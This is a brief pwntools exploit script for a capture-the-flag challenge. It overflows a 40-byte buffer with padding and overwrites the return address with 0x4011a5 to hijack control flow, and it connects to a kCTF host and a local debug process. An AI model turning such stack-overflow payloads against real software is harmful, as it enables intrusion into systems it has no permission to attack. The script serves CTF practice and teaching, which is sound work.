from pwn import *

pr = remote('p0wn3d3.kctf-453514-codelab.kctf.cloud', 1337) 
elf = context.binary = ELF('./chal', checksec=False)
context.binary = elf
padding = 40

payload = flat(
    b'A' * padding,
    p64(0x00000000004011a5),
)

pr = elf.process()
pr = elf.debug(gdbscript="b main")


info(f"Payload: {payload}")
pr.recvuntil(b"before\n")
pr.sendline(payload)

print(pr.recvall())